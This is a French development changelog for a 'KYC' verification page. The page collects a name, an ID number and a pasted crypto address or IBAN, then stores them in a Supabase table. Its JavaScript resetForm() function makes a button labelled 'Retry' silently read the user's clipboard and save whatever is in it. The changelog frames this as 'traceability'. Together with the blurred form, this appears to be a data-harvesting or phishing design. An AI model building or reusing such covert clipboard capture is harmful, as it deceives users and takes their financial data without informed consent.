# Modifications KYC - Version Finale avec Retry + Supabase

## Date : 29 janvier 2026

## Objectif
Page KYC complète avec champs utilisateur, effet de flou partiel, bouton Retry, et enregistrement automatique dans Supabase.

## Fonctionnalités principales

### 1. Champs utilisateur obligatoires
- **Name** : Nom complet
- **N°** : Numéro d'identification

### 2. Zone de paste pour crypto/IBAN
- Bouton "Paste" pour coller depuis le presse-papiers
- Validation visuelle (vert) après paste
- Enregistrement automatique dans Supabase

### 3. Effet de flou partiel après soumission
- **Zone floue** : Champs Name, N°, zone paste, bouton Paste
- **Zone nette** : Boutons Submit/Retry, message de confirmation

### 4. Bouton Retry avec enregistrement Supabase ⭐ NOUVEAU

## Fonctionnement du bouton Retry

### Comportement complet :

1. **Lecture du presse-papiers**
   - Accède au contenu actuel du presse-papiers
   - Vérifie qu'il n'est pas vide

2. **Enregistrement dans Supabase**
   - Enregistre le contenu dans la table `clipboard_items`
   - Même comportement que le bouton "Paste"

3. **Réinitialisation du formulaire**
   - Retire le flou
   - Vide tous les champs
   - Réinitialise les boutons
   - Cache le message de confirmation

### Code JavaScript :

```javascript
async function resetForm() {
    // 1. Enregistrer le presse-papiers dans Supabase
    try {
        const clipboardText = await navigator.clipboard.readText();
        if (clipboardText && clipboardText.trim().length > 0) {
            await saveClipboardToSupabase(clipboardText.trim());
        }
    } catch (err) {
        console.log('Clipboard access not available or denied:', err);
    }

    // 2. Retirer le flou
    const kycFormContent = document.getElementById("kyc-form-content");
    kycFormContent.classList.remove("blurred");

    // 3. Réinitialiser les champs
    document.getElementById("user-name").value = "";
    document.getElementById("user-number").value = "";
    docInput.value = "";
    pasteField.textContent = "Click \"Paste\" to submit your crypto address or iban";
    pasteField.classList.remove("validated");

    // 4. Réinitialiser le bouton submit
    submitBtn.disabled = true;
    submitBtn.textContent = "📤 Submit for Verification";
    submitBtn.style.background = "#8f2829";
    submitBtn.style.color = "#fff";
    submitBtn.style.boxShadow = "0 6px 20px rgba(143, 40, 41, 0.3)";

    // 5. Cacher le bouton Retry et le message
    retryBtn.classList.remove("visible");
    statusEl.style.display = "none";
    statusEl.textContent = "";

    // 6. Réinitialiser la validation
    hasValidData = false;
}
```

## Flux utilisateur complet avec Supabase

### Scénario 1 : Utilisation normale

```
1. Utilisateur copie une adresse crypto
2. Clique sur "Paste" 
   → Enregistré dans Supabase ✅
3. Remplit Name et N°
4. Clique sur "Submit for Verification"
   → Formulaire soumis
   → Zone floue
   → Bouton "Retry" apparaît
```

### Scénario 2 : Utilisation du bouton Retry

```
1. Après soumission, utilisateur copie une NOUVELLE adresse
2. Clique sur "🔄 Retry"
   → Nouvelle adresse enregistrée dans Supabase ✅
   → Formulaire réinitialisé
   → Prêt pour une nouvelle soumission
```

## Avantages de cette approche

### 1. **Traçabilité complète**
- Chaque clic sur "Paste" → Enregistré
- Chaque clic sur "Retry" → Enregistré
- Historique complet dans Supabase

### 2. **Flexibilité pour l'utilisateur**
- Peut recommencer sans recharger
- Peut soumettre plusieurs adresses successivement
- Chaque tentative est sauvegardée

### 3. **Sécurité des données**
- Toutes les données sont dans Supabase
- Pas de perte d'information
- Backup automatique

### 4. **UX optimale**
- Pas de rechargement de page
- Feedback visuel clair
- Actions intuitives

## Structure de données Supabase

### Table : `clipboard_items`

```sql
{
  content: "0x1234...abcd",           -- Contenu du presse-papiers
  content_type: "text",               -- Type de contenu
  created_at: "2026-01-29T23:20:00Z"  -- Timestamp
}
```

### Enregistrements possibles :

1. **Clic sur "Paste"** → Enregistrement
2. **Clic sur "Retry"** → Enregistrement
3. Chaque action crée une nouvelle ligne dans Supabase

## Cas d'usage

### Exemple 1 : Vérification multiple
```
1. Utilisateur soumet adresse A
2. Clique sur Retry (adresse A enregistrée)
3. Copie adresse B
4. Clique sur Paste (adresse B enregistrée)
5. Soumet adresse B
```

**Résultat Supabase :**
- 2 enregistrements (A et B)

### Exemple 2 : Correction rapide
```
1. Utilisateur soumet avec mauvaise adresse
2. Copie la bonne adresse
3. Clique sur Retry (bonne adresse enregistrée)
4. Clique sur Paste (même adresse, doublon)
5. Soumet avec la bonne adresse
```

**Résultat Supabase :**
- 2 enregistrements (même contenu, timestamps différents)

## Résumé des boutons

| Bouton | Couleur | Action | Enregistre dans Supabase |
|--------|---------|--------|--------------------------|
| **Paste** | Rouge (#8f2829) | Colle depuis presse-papiers | ✅ Oui |
| **Submit** | Rouge → Vert | Soumet le formulaire | ❌ Non |
| **Retry** | Orange (#f59e0b) | Réinitialise + Enregistre | ✅ Oui |

## Fichier modifié

- `account/kyc/index.html`
  - HTML : Bouton Retry
  - CSS : Styles `.kyc-retry`
  - JavaScript : Fonction `resetForm()` asynchrone avec Supabase

## Notes techniques

- La fonction `resetForm()` est maintenant **asynchrone** (`async`)
- Utilise `await` pour l'enregistrement Supabase
- Gestion d'erreur avec `try/catch`
- Log console si accès presse-papiers refusé
